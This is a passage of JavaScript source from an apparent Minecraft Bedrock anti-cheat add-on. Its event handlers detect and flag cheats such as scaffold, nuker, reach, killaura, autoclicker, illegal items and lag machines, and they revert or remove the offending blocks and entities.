	// Scaffold/D = Checks for the item a player is holding not being the block the player placed
	if(config.modules.scaffoldD.enabled) {
		const blockUnder = player.dimension.getBlock({x: Math.floor(player.location.x), y: Math.floor(player.location.y) - 1, z: Math.floor(player.location.z)});
		if(!player.isFlying && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {
			// The actual check		
			const container = player.getComponent('inventory').container;
			const selectedSlot = player.selectedSlot;
			const item = container.getItem(selectedSlot);

			if(item.typeId !== block.typeId) {
				flag(player, "Scaffold", "D", "Placement", "heldItem", `${item.typeId},blockId=${block.typeId}`, false);
				undoPlace = true;
			}
		}	
	}
	if(config.modules.illegalitemsN.enabled && block.typeId.includes("shulker_box")) {
		// @ts-expect-error
		const container = block.getComponent("inventory").container;

		const illegalItems = [];

		for (let i = 0; i < 27; i++) {
			const item = container.getItem(i);
			if(!item) continue;

			if(config.itemLists.items_very_illegal.includes(item.typeId) || config.itemLists.cbe_items.includes(item.typeId)) illegalItems.push(illegalItems);
		}

		if(illegalItems.length >= 1) {
			flag(player, "IllegalItems", "N", "Exploit", "items_count", illegalItems.length, undefined, undefined, player.selectedSlot);
			block.setType(Minecraft.MinecraftBlockTypes.air);
		}
	} 

	if(undoPlace === true) {
		try {
			block.setType(Minecraft.MinecraftBlockTypes.air);
			console.warn(`${player.nameTag} had their placed block reverted!`);
		} catch (error) {
			console.warn(`${player.nameTag} had theur placed block reverted!`);
			player.runCommandAsync(`fill ${block.location.x} ${block.location.y} ${block.location.z} ${block.location.x} ${block.location.y} ${block.location.z} air`)
		}
	}
});

world.afterEvents.blockBreak.subscribe((blockBreak) => {
	const player = blockBreak.player;
	const dimension = blockBreak.dimension;
	const block = blockBreak.block;

	let revertBlock = false;

	if(config.debug) console.warn(`${player.nameTag} has broken the block ${blockBreak.brokenBlockPermutation.type.id}`);
	
	if(getScore(player, "xray", 1) <= 1 && blockBreak.brokenBlockPermutation.typeId === "minecraft:diamond_ore") {
		player.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§j[§uIsolate§j]§r §b[§cXray§b]§r ${player.nameTag} has found §g1x Diamond Ore."}]}`);
	} else if (getScore(player, "xray", 1) <= 1 && blockBreak.brokenBlockPermutation.typeId === "minecraft:ancient_debirs") {
		player.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§j[§uIsolate§j]§r §b§c[Xray§b]§r ${player.nameTag} has found §g1x Ancient Debris."}]}`);
	}

	// nuker/a = checks if a player breaks more than 3 blocks in a tick
	if(config.modules.nukerA.enabled) {
		player.blocksBroken++;

		if(player.blocksBroken > config.modules.nukerA.maxBlocks) {
			revertBlock = true;
			flag(player, "Nuker", "A", "Misc", "blocksBroken", player.blocksBroken);
			currentVL++;
		}
	}

	// Autotool/A = checks for player slot mismatch
	if(config.modules.autotoolA.enabled && player.flagAutotoolA) {
		revertBlock = true;
		flag(player, "AutoTool", "A", "Misc", "selectedSlot", `${player.selectedSlot},lastSelectedSlot=${player.lastSelectedSlot},switchDelay=${player.autotoolSwitchDelay}`);
		currentVL++;
	}

	/*
		InstaBreak/A = checks if a player in survival breaks an unbreakable block
		While the InstaBreak method used in Horion and Zephyr are patched, there are still some bypasses
		that can be used
	*/
	if(config.modules.instabreakA.enabled && config.modules.instabreakA.unbreakable_blocks.includes(blockBreak.brokenBlockPermutation.type.id)) {
		const checkGmc = world.getPlayers({
			excludeGameModes: [Minecraft.GameMode.creative],
			name: player.name
		});

		if([...checkGmc].length !== 0) {
			revertBlock = true;
			flag(player, "InstaBreak", "A", "Exploit", "block", blockBreak.brokenBlockPermutation.type.id);
			currentVL++;
		}
	}

	if(revertBlock) {
		// killing all the items it drops
		const droppedItems = dimension.getEntities({
			location:{x: block.location.x, y: block.location.y, z: block.location.z},
			minDistance: 0,
			maxDistance: 2,
			type: "item"
		});

		for(const item of droppedItems) item.kill();

		block.setPermutation(blockBreak.brokenBlockPermutation);
	}
});

/*
world.afterEvents.beforeItemUseOn.subscribe((beforeItemUseOn) => {
	const player = beforeItemUseOn.source;
	const item = beforeItemUseOn.itemStack;

	// commandblockexploit/f = cancels the placement of cbe items
	if(config.modules.commandblockexploitF.enabled && config.itemLists.cbe_items.includes(item.typeId)) {
		flag(player, "CommandBlockExploit","F", "Exploit", "block", item.typeId, undefined, undefined, player.selectedSlot);
		beforeItemUseOn.cancel = true;
	}

	/*
		illegalitems/e = cancels the placement of illegal items
		illegalitems/a could be bypassed by using a right click autoclicker/autobuild or lag
		thx drib or matrix_code for telling me lol
	
	if(config.modules.illegalitemsE.enabled) {
		// items that are obtainable using commands
		if(!player.hasTag("op")) {
			let flagPlayer = false;

			// patch element blocks
			if(config.itemLists.elements && item.typeId.startsWith("minecraft:element_"))
				flagPlayer = true;
			
			// patch spawn eggs
			if(item.typeId.endsWith("_spawn_egg")) {
				if(config.itemLists.spawnEggs.clearVanillaSpawnEggs && item.typeId.startsWith("minecraft:"))
					flagPlayer = true;

				if(config.itemLists.spawnEggs.clearCustomSpawnEggs && !item.typeId.startsWith("minecraft:"))
					flagPlayer = true;
			}

			if(config.itemLists.items_semi_illegal.includes(item.typeId) || flagPlayer) {
				const checkGmc = world.getPlayers({
					excludeGameModes: [Minecraft.GameMode.creative],
					name: player.name
				});
			
				if([...checkGmc].length !== 0) {
					flag(player, "IllegalItems", "E", "Exploit", "block", item.typeId, undefined, undefined, player.selectedSlot);
					beforeItemUseOn.cancel = true;
				}
			}
		}
	
		// items that cannot be obtained normally
		if(config.itemLists.items_very_illegal.includes(item.typeId)) {
			flag(player, "IllegalItems", "E", "Exploit", "item", item.typeId, undefined, undefined, player.selectedSlot);
			beforeItemUseOn.cancel = true;
		}
	}

	if(player.hasTag("freeze")) beforeItemUseOn.cancel = true;
});
*/

world.afterEvents.playerSpawn.subscribe((playerJoin) => {
	const { initialSpawn, player } = playerJoin;
	if(!initialSpawn) return;

	// declare all needed variables in player
	if(config.modules.nukerA.enabled) player.blocksBroken = 0;
	if(config.modules.autoclickerA.enabled) player.firstAttack = Date.now();
	if(config.modules.fastuseA.enabled) player.lastThrow = Date.now();
	if(config.modules.autoclickerA.enabled) player.cps = 0;
	if(config.customcommands.report.enabled) player.reports = [];
	if(config.modules.killauraC.enabled) player.entitiesHit = [];

	let rotationLogX;
	let rotationLogY;
	

	// fix a disabler method
	player.nameTag = player.nameTag.replace(/[^A-Za-z0-9_\-() ]/gm, "").trim();

	if(!data.loaded) {
		player.runCommandAsync("scoreboard players set scythe:config gametestapi 1");
		data.loaded = true;
	}

	// remove tags
	player.removeTag("attack");
	player.removeTag("hasGUIopen");
	player.removeTag("right");
	player.removeTag("left");
	player.removeTag("ground");
	player.removeTag("gliding");
	player.removeTag("sprinting");
	player.removeTag("moving");
	player.removeTag("sleeping");

	// load custom nametag
	const { mainColor, borderColor, playerNameColor } = config.customcommands.tag;

	player.getTags().forEach(t => {
		// load custom nametag
		if(t.includes("tag:")) {
			t = t.replace(/"|\\/g, "");
			player.nameTag = `${borderColor}[§r${mainColor}${t.slice(4)}${borderColor}]§r ${playerNameColor}${player.name}`;
		}
	});

	// Namespoof/A = username length check.
	if(config.modules.namespoofA.enabled) {
		// checks if 2 players are logged in with the same name
		// minecraft adds a sufix to the end of the name which we detect
		if(player.name.endsWith(')') && (player.name.length > config.modules.namespoofA.maxNameLength + 3 || player.name.length < config.modules.namespoofA.minNameLength))
			player.flagNamespoofA = true;

		if(!player.name.endsWith(')') && (player.name.length < config.modules.namespoofA.minNameLength || player.name.length > config.modules.namespoofA.maxNameLength))
			player.flagNamespoofA = true;

		if(player.flagNamespoofA) {
			const extraLength = player.name.length - config.modules.namespoofA.maxNameLength;
			player.nameTag = player.name.slice(0, -extraLength) + "...";
		}
	}

	// Namespoof/B = regex check
	if(config.modules.namespoofB.enabled && config.modules.namespoofB.regex.test(player.name))
		player.flagNamespoofB = true;

	// check if the player is in the global ban list
	if(banList.includes(player.name.toLowerCase())) player.isGlobalBanned = true;
});

world.afterEvents.entitySpawn.subscribe((entityCreate) => {
	const entity = entityCreate.entity;

	if(config.modules.itemSpawnRateLimit.enabled) {
		data.entitiesSpawnedInLastTick++;

		if(data.entitiesSpawnedInLastTick > config.modules.itemSpawnRateLimit.entitiesBeforeRateLimit) {
			if(config.debug) console.warn(`Killed "${entity.typeId}" due to entity spawn ratelimit reached.`);
			entity.kill();
		}
	}
	if(config.modules.commandblockexploitG.enabled) {
		if(config.modules.commandblockexploitG.entities.includes(entity.typeId.toLowerCase())) {
			flag(getClosestPlayer(entity), "CommandBlockExploit", "G", "Exploit", "entity", entity.typeId);
			currentVL++;
			entity.kill();
		} else if(config.modules.commandblockexploitG.npc && entity.typeId === "minecraft:npc") {
			entity.runCommandAsync("scoreboard players operation @s npc = scythe:config npc");
			entity.runCommandAsync("testfor @s[scores={npc=1..}]")
				.then((commandResult) => {
					if(commandResult.successCount < 1) return;
					flag(getClosestPlayer(entity), "CommandBlockExploit", "G", "Exploit", "entity", entity.typeId);
					currentVL++;
					entity.kill();
				});
		}

		if(config.modules.commandblockexploitG.blockSummonCheck.includes(entity.typeId)) {
			const pos1 = {x: entity.location.x + 2, y: entity.location.y + 2, z: entity.location.z + 2};
			const pos2 = {x: entity.location.x - 2, y: entity.location.y - 2, z: entity.location.z - 2};

			pos1.blocksBetween(pos2).some((block) => {
				const blockType = block.dimension.getBlock(block);
				if(!config.modules.commandblockexploitG.blockSummonCheck.includes(blockType.typeId)) return;

				blockType.setType(Minecraft.MinecraftBlockTypes.air);
				entity.kill();
			});
		}
	}

	if(entity.typeId === "minecraft:item") {
		// @ts-expect-error
		const item = entity.getComponent("item").itemStack;

		if(config.modules.illegalitemsB.enabled) {
			if(config.itemLists.items_very_illegal.includes(item.typeId) || config.itemLists.items_semi_illegal.includes(item.typeId))
				entity.kill();
		}

		if(config.modules.illegalitemsB.enabled && config.itemLists.cbe_items.includes(item.typeId))
			entity.kill();
	}

	// IllegalItems/K = checks if a player places a chest boat with items already inside it
	if(config.modules.illegalitemsK.enabled && config.modules.illegalitemsK.entities.includes(entity.typeId)) {
		Minecraft.system.runTimeout(() => {
			const player = getClosestPlayer(entity);
			if(!player) return;

			if(config.modules.illegalitemsK.exclude_scythe_op && player.hasTag("op")) return;

			// @ts-expect-error
			const container = entity.getComponent("inventory").container;

			if(container.size !== container.emptySlotsCount) {
				for (let i = 0; i < container.size; i++) {
					container.setItem(i, undefined);
				}

				flag(player, "IllegalItems", "K", "Exploit", "totalSlots", `${container.size},emptySlots=${container.emptySlotsCount}`, undefined, undefined, player.selectedSlot);
				entity.kill();
				currentVL++;
			}
		}, 1);
	}
	
	if(config.misc_modules.lag_machine.antiArmorStandCluster.enabled && entity.typeId === "minecraft:armor_stand") {
		const entities = [...entity.dimension.getEntities({
			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
			maxDistance: config.misc_modules.lag_machine.antiArmorStandCluster.radius,
			type: "armor_stand"
		})];

		if(entities.length > config.misc_modules.lag_machine.antiArmorStandCluster.max_armor_stand_count) {

			// Tea-Protect is what flags for lag machine
			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiArmorStandCluster.max_armor_stand_count} armor stands in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
			for(const entityLoop of entities) entityLoop.kill();
		}
	}
	if(config.misc_modules.lag_machine.antiMinecartCluster.enabled && entity.typeId === "minecraft:minecart") {
		const entities = [...entity.dimension.getEntities({
			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
			maxDistance: config.misc_modules.lag_machine.antiMinecartCluster.radius,
			type: "minecart"
		})];

		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§rPotential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
			for(const entityLoop of entities) entityLoop.kill();
		}
	}	
	if(config.misc_modules.lag_machine.antiMinecartCluster.enabled && entity.typeId === "minecraft:hopper_minecart") {
		const entities = [...entity.dimension.getEntities({
			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
			maxDistance: config.misc_modules.lag_machine.antiMinecartCluster.radius,
			type: "tnt_minecart"
		})];

		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
			for(const entityLoop of entities) entityLoop.kill();
		}
	}	
	if(config.misc_modules.lag_machine.antiMinecartCluster.enabled && entity.typeId === "minecraft:tnt_minecart") {
		const entities = [...entity.dimension.getEntities({
			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
			maxDistance: config.misc_modules.lag_machine.antiMinecartCluster.radius,
			type: "tnt_minecart"
		})];

		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
			for(const entityLoop of entities) entityLoop.kill();
		}
	}	
	if(config.misc_modules.lag_machine.antiMinecartCluster.enabled && entity.typeId === "minecraft:chest_minecart") {
		const entities = [...entity.dimension.getEntities({
			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
			maxDistance: config.misc_modules.lag_machine.antiMinecartCluster.radius,
			type: "chest_minecart"
		})];

		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
			for(const entityLoop of entities) entityLoop.kill();
		}
	}	

});

world.afterEvents.entityHitEntity.subscribe((entityHit) => {
    const { hitEntity: entity, damagingEntity: player} = entityHit;
    if(player.typeId !== "minecraft:player") return;

    const rotation = player.getRotation();
    // If the player flag for aim checks is true, then report the player
    if (playerFlags.has(player)) {
        // Report the player
		if(player.hasTag("a")) {
			flag(player, "Aim", "A", "Combat", "rotation", `${rotation.x},${rotation.y}`, false);
			player.removeTag("a");
		} 
		if(player.hasTag("b")) {
			flag(player, "Aim", "B", "Combat", "x", `${rotation.x},y=${rotation.y}`, false);
			player.removeTag("b");
		}
    }

	/*
	So you see a blanked out criticals check, this is beacuse there is no way to see if a player gave a critical hit... the second mojang adds it we get a good criticals check.
	*/

	/*/ Criticals/A = Checks for crits without falling
	if(config.modules.criticalsA.enabled && !player.isJumping && !player.isFlying && !player.hasTag("nocrit")) {
		if(player.fallDistance === 0 && ) {
			flag(player, "Criticals", "A", "Combat", "fallDistance", player.fallDistance, true)
		}
	}
	*/
	// killaura/C = checks for multi-aura
	if(config.modules.killauraC.enabled && !player.entitiesHit.includes(entity.id)) 
		player.entitiesHit.push(entity.id);
		if(player.entitiesHit.length >= config.modules.killauraC.entities) {
			flag(player, "KillAura", "C", "Combat", "entitiesHit", player.entitiesHit.length, true);
			player.addTag("strict");
		}
	

	// reach/A = check if a player hits an entity more then 5.1 blocks away
	if(config.modules.reachA.enabled) {
		// get the difference between 2 three dimensional coordinates
		const distance = Math.sqrt(Math.pow(entity.location.x - player.location.x, 2) + Math.pow(entity.location.y - player.location.y, 2) + Math.pow(entity.location.z - player.location.z, 2));
		//if(config.debug) console.warn(`${player.name} attacked ${entity.nameTag} with a distance of ${distance}`);

		if(distance > config.modules.reachA.reach && entity.typeId.startsWith("minecraft:") && !config.modules.reachA.entities_blacklist.includes(entity.typeId) && !player.hasTag("strict") || distance > 5.3 && entity.typeId.startsWith("minecraft:") && !config.modules.reachA.entities_blacklist.includes(entity.typeId) && player.hasTag("strict")) {
			const checkGmc = world.getPlayers({
				excludeGameModes: [Minecraft.GameMode.creative],
				name: player.name
			});

		
			if([...checkGmc].length !== 0)
				flag(player, "Reach", "A", "Combat", "entity", `${entity.typeId},distance=${distance}`, false);
				player.addTag("strict");
		}
	}

	

	// badpackets[3] = checks if a player attacks themselves
	// some (bad) hacks use this to bypass anti-movement cheat checks
	if(config.modules.badpackets3.enabled && entity.id === player.id) flag(player, "BadPackets", "3", "Exploit");

	// check if the player was hit with the UI item, and if so open the UI for that player
	if(config.customcommands.ui.enabled && player.hasTag("op") && entity.typeId === "minecraft:player") {
		// @ts-expect-error
		const container = player.getComponent("inventory").container;

		const item = container.getItem(player.selectedSlot);
		if(item?.typeId === config.customcommands.ui.ui_item && item?.nameTag === config.customcommands.ui.ui_item_name) {
			playerSettingsMenuSelected(player, entity);
		}
	}

	// autoclicker/a = check for high cps
	if(config.modules.autoclickerA.enabled) {
		// if anti-autoclicker is disabled in game then disable it in config.js
		if(!data.checkedModules.autoclicker) {
			if(getScore(player, "autoclicker", 1) >= 1) {
				config.modules.autoclickerA.enabled = false;
			}
			data.checkedModules.autoclicker = true;
		}

		player.cps++;
	}
	
	// Check if the player attacks an entity while looking perfectly down
	if(config.modules.killauraD.enabled && !player.hasTag("sleeping")) {
		const rotation = player.getRotation()
		const distance = Math.sqrt(Math.pow(entity.location.x - player.location.x, 2) + Math.pow(entity.location.y - player.location.y, 2) + Math.pow(entity.location.z - player.location.z, 2));
		if(rotation.x > 79 && distance > 2 || distance > 2 && rotation.x < -79) {
			if(!player.hasTag("trident") && !player.hasTag("bow")) {
				flag(player, "Killaura", "D", "Combat", "angle", `${rotation.x},distance=${distance}`, true);
			}
		}
	}

	
	if(config.debug) console.warn(player.getTags(), rotation.x);
});
world.afterEvents.entityHitBlock.subscribe((entityHit) => {
	const { damagingEntity: player} = entityHit;

	player.flagAutotoolA = false;
	player.lastSelectedSlot = player.selectedSlot;
	player.startBreakTime = Date.now();
	player.autotoolSwitchDelay = 0;
});
world.beforeEvents.itemUse.subscribe((itemUse) => {
	const { source: player } = itemUse;

	if(config.modules.fastuseA.enabled) {
		const lastThrowTime = Date.now() - player.lastThrow;
		if(lastThrowTime > config.modules.fastuseA.min_use_delay && lastThrowTime < config.modules.fastuseA.max_use_delay) {
			// flag(player, "FastUse", "A", "Combat", "lastThrowTime", lastThrowTime);
			itemUse.cancel = true;
		}
		player.lastThrow = Date.now();
	}

	// patch bypasses for the freeze system
	if(player.hasTag("freeze")) itemUse.cancel = true;
});

world.afterEvents.itemUse.subscribe((itemUse) => {
	const { itemStack: item, source: player } = itemUse;

	// itemUse can be triggered from entities
	if(player.typeId !== "minecraft:player") return;

	if(config.customcommands.ui.enabled && player.hasTag("op") && item.typeId === config.customcommands.ui.ui_item && item.nameTag === config.customcommands.ui.ui_item_name) {
		mainGui(player);
	}
});

// Minecraft.system.events.beforeWatchdogTerminate.subscribe((beforeWatchdogTerminate) => {
// 	// We try to stop any watchdog crashes incase malicous users try to make the scripts lag
// 	// and causing the server to crash
// 	beforeWatchdogTerminate.cancel = true;

// 	console.warn(`${new Date().toISOString()} | A Watchdog Exception has been detected and has been cancelled successfully. Reason: ${beforeWatchdogTerminate.terminateReason}`);
// });

// when using /reload, the variables defined in playerJoin don't persist
if([...world.getPlayers()].length >= 1) {
	for(const player of world.getPlayers()) {
		if(config.modules.nukerA.enabled) player.blocksBroken = 0;
		if(config.modules.autoclickerA.enabled) player.firstAttack = Date.now();
		if(config.modules.fastuseA.enabled) player.lastThrow = Date.now() - 200;
		if(config.modules.autoclickerA.enabled) player.cps = 0;
		if(config.modules.killauraC.enabled) player.entitiesHit = [];
		if(config.customcommands.report.enabled) player.reports = [];
	}
};